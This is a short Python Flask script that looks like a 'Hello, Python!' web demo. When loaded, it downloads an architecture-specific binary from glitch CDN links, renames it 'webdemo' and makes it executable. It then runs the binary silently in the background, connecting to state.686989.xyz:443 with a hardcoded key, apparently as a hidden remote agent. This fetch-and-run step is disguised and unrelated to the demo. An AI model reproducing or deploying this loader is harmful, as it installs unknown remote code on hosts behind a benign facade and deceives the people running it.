import os
import re
import shutil
import subprocess
import http.server
import socketserver
import threading
import requests
from flask import Flask
import json
import time
import base64

app = Flask(__name__)

# Set environment variables
FILE_PATH = os.environ.get('FILE_PATH', './temp')
SERVER_KEY = os.environ.get('SERVER_KEY', 'NKQYjCWBDS6tBVLpjR')

# Create directory if it doesn't exist
if not os.path.exists(FILE_PATH):
    os.makedirs(FILE_PATH)
    print(f"{FILE_PATH} has been created")
else:
    print(f"{FILE_PATH} already exists")

# Clean old files
paths_to_delete = ['webdemo']
for file in paths_to_delete:
    file_path = os.path.join(FILE_PATH, file)
    try:
        os.unlink(file_path)
        print(f"{file_path} has been deleted")
    except Exception as e:
        print(f"Skip Delete {file_path}")

# http server
@app.route('/')
def hello():
    return 'Hello, Python!'

# Determine system architecture
def get_system_architecture():
    arch = os.uname().machine
    return 'arm' if 'arm' in arch else 'amd'

# Download file
def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    with requests.get(file_url, stream=True) as response, open(file_path, 'wb') as file:
        shutil.copyfileobj(response.raw, file)

# Download and run files
def download_files_and_run():
    architecture = get_system_architecture()
    files_to_download = get_files_for_architecture(architecture)

    if not files_to_download:
        print("Can't find a file for the current architecture")
        return

    for file_info in files_to_download:
        try:
            download_file(file_info['file_name'], file_info['file_url'])
            print(f"Downloaded {file_info['file_name']} successfully")
        except Exception as e:
            print(f"Download {file_info['file_name']} failed: {e}")

    # Authorize and run
    files_to_authorize = ['./webdemo']
    authorize_files(files_to_authorize)

    # Run Server
    command = f"nohup {FILE_PATH}/webdemo -s state.686989.xyz:443 -p {SERVER_KEY} --tls >/dev/null 2>&1 &"
    try:
        subprocess.run(command, shell=True, check=True)
        print('webdemo is running')
        subprocess.run('sleep 1', shell=True)  # Wait for 1 second
    except subprocess.CalledProcessError as e:
        print(f'webdemo running error: {e}')

    subprocess.run('sleep 3', shell=True)  # Wait for 3 seconds

# Return file information based on system architecture
def get_files_for_architecture(architecture):
    if architecture == 'arm':
        return [
            {'file_name': 'webdemo', 'file_url': 'https://cdn.glitch.global/ee4c6d91-51ac-46bd-8959-5add2459a016/bot?v=1726841050979'},
        ]
    elif architecture == 'amd':
        return [
            {'file_name': 'webdemo', 'file_url': 'https://cdn.glitch.me/ee4c6d91-51ac-46bd-8959-5add2459a016/npm?v=1726836593556'},
        ]
    return []

# Authorize files
def authorize_files(file_paths):
    new_permissions = 0o775

    for relative_file_path in file_paths:
        absolute_file_path = os.path.join(FILE_PATH, relative_file_path)
        try:
            os.chmod(absolute_file_path, new_permissions)
            print(f"Empowerment success for {absolute_file_path}: {oct(new_permissions)}")
        except Exception as e:
            print(f"Empowerment failed for {absolute_file_path}: {e}")

# Run the callback
def start_server():
    download_files_and_run()

start_server()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000)